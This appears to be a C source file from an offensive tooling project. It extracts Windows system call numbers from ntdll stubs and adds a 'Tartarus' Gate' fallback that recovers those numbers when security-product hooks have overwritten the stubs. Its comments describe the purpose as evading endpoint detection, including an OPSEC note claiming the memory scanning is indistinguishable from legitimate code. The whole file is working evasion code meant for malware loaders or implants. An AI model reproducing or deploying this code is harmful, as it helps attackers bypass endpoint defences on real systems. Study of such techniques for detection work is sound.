#include "syscalls.h"

/* ========================================================================
 * PE Text Section Helper (for Tartarus' Gate bounds checking)
 * ======================================================================== */

static int get_text_section_bounds(void *module_base,
                                   unsigned char **text_start,
                                   unsigned char **text_end)
{
    unsigned char *base = (unsigned char *)module_base;
    if (!base) return -1;

    LONG e_lfanew = *(LONG *)(base + 0x3C);
    if (e_lfanew < 0 || e_lfanew > 0x1000) return -1;

    unsigned char *nt = base + e_lfanew;
    if (*(DWORD *)nt != 0x00004550) return -1;

    WORD num_sections = *(WORD *)(nt + 6);
    WORD opt_hdr_size = *(WORD *)(nt + 20);
    unsigned char *sections = nt + 24 + opt_hdr_size;

    for (WORD i = 0; i < num_sections; i++) {
        unsigned char *sec = sections + (i * 40);
        if (sec[0] == '.' && sec[1] == 't' && sec[2] == 'e' &&
            sec[3] == 'x' && sec[4] == 't') {
            DWORD virt_size = *(DWORD *)(sec + 8);
            DWORD virt_addr = *(DWORD *)(sec + 12);
            *text_start = base + virt_addr;
            *text_end   = base + virt_addr + virt_size;
            return 0;
        }
    }
    return -1;
}

/* ========================================================================
 * SSN Extraction — Standard
 * ======================================================================== */

// Extract syscall number from NT function stub
// Looks for the pattern: 4C 8B D1 B8 [SSN] 0F 05 C3
// Returns 0 if not found, otherwise the syscall number
DWORD extract_ssn(void *func_addr) {
    unsigned char *p = (unsigned char *)func_addr;
    
    if (!p) {
        return 0;
    }
    
    // Follow any trampolines (up to 5 hops)
    for (int i = 0; i < 5; i++) {
        // JMP rel32 (E9 XX XX XX XX)
        if (p[0] == 0xE9) {
            int rel = *(int *)(p + 1);
            p = p + 5 + rel;
            continue;
        }
        // JMP rel8 (EB XX)
        if (p[0] == 0xEB) {
            signed char rel = *(signed char *)(p + 1);
            p = p + 2 + rel;
            continue;
        }
        // JMP [rip+rel32] (FF 25 XX XX XX XX)
        if (p[0] == 0xFF && p[1] == 0x25) {
            int rel = *(int *)(p + 2);
            void **target = (void **)(p + 6 + rel);
            p = (unsigned char *)*target;
            continue;
        }
        break;
    }
    
    // Scan for syscall stub pattern within 128 bytes (increased from 96)
    // Pattern: 4C 8B D1 B8 [XX XX XX XX] 0F 05 C3
    // Translation: mov r10, rcx; mov eax, <ssn>; syscall; ret
    for (int offset = 0; offset < 128; offset++) {
        if (p[offset] == 0x4C && 
            p[offset + 1] == 0x8B && 
            p[offset + 2] == 0xD1 && 
            p[offset + 3] == 0xB8) {
            // Extract the 4-byte syscall number
            DWORD ssn = *(DWORD *)(p + offset + 4);
            return ssn;
        }
    }
    
    // Alternative pattern: Sometimes NT stubs have different prologues
    // Look for just: B8 [SSN] 0F 05 C3 (mov eax, ssn; syscall; ret)
    for (int offset = 0; offset < 128; offset++) {
        if (p[offset] == 0xB8 &&
            p[offset + 5] == 0x0F &&
            p[offset + 6] == 0x05 &&
            p[offset + 7] == 0xC3) {
            // Extract the 4-byte syscall number
            DWORD ssn = *(DWORD *)(p + offset + 1);
            return ssn;
        }
    }
    
    return 0;
}

/* ========================================================================
 * SSN Extraction — Tartarus' Gate Fallback
 *
 * When a stub is hooked and the standard pattern (4C 8B D1 B8 / B8...0F 05 C3)
 * is destroyed, Tartarus' Gate recovers the SSN by scanning neighboring stubs.
 *
 * NT syscall stubs are spaced 0x20 (32) bytes apart in ntdll's .text section.
 * If stub[N] is hooked but stub[N+d] is clean, then:
 *   SSN[N] = SSN[N+d] - d   (forward neighbor)
 *   SSN[N] = SSN[N-d] + d   (backward neighbor)
 *
 * Tartarus' Gate scans up to MAX_SCAN stubs in each direction, handling
 * environments where multiple consecutive stubs are hooked. This is superior
 * to Halo's Gate which only checks immediate neighbors (+/- 1).
 *
 * OPSEC: Pure memory reads within ntdll .text. No API calls. No allocations.
 *        The scanning pattern is indistinguishable from legitimate code
 *        reading ntdll memory.
 * ======================================================================== */

DWORD extract_ssn_with_fallback(void *func_addr, void *ntdll_base)
{
    /* Step 1: Try standard extraction first (fast path) */
    DWORD ssn = extract_ssn(func_addr);
    if (ssn != 0) return ssn;

    /* Step 2: Standard extraction failed — stub is likely hooked.
     * Activate Tartarus' Gate: scan neighboring stubs. */
    if (!ntdll_base) return 0;

    unsigned char *stub = (unsigned char *)func_addr;
    const int STUB_SIZE = 0x20;  /* 32 bytes between NT stubs */
    const int MAX_SCAN  = 10;    /* Scan up to 10 stubs each direction */

    /* Get .text section bounds for safety — don't read outside it */
    unsigned char *text_start = NULL;
    unsigned char *text_end   = NULL;
    if (get_text_section_bounds(ntdll_base, &text_start, &text_end) != 0)
        return 0;

    for (int dist = 1; dist <= MAX_SCAN; dist++) {
        /* Forward neighbor: stub + (dist * 0x20) */
        unsigned char *fwd = stub + (dist * STUB_SIZE);
        if (fwd >= text_start && fwd + 8 < text_end) {
            /* Check for clean stub pattern: 4C 8B D1 B8 [SSN] */
            if (fwd[0] == 0x4C && fwd[1] == 0x8B &&
                fwd[2] == 0xD1 && fwd[3] == 0xB8) {
                DWORD neighbor_ssn = *(DWORD *)(fwd + 4);
                if (neighbor_ssn >= (DWORD)dist)
                    return neighbor_ssn - dist;
            }
        }

        /* Backward neighbor: stub - (dist * 0x20) */
        unsigned char *bwd = stub - (dist * STUB_SIZE);
        if (bwd >= text_start && bwd + 8 < text_end) {
            if (bwd[0] == 0x4C && bwd[1] == 0x8B &&
                bwd[2] == 0xD1 && bwd[3] == 0xB8) {
                DWORD neighbor_ssn = *(DWORD *)(bwd + 4);
                return neighbor_ssn + dist;
            }
        }
    }

    /* All neighbors hooked within scan range — give up */
    return 0;
}

// All invoke_syscall_N and syscall_nt_* stubs are in syscalls_asm.s
// (Pure assembly is more reliable for syscall invocation and stack layout)

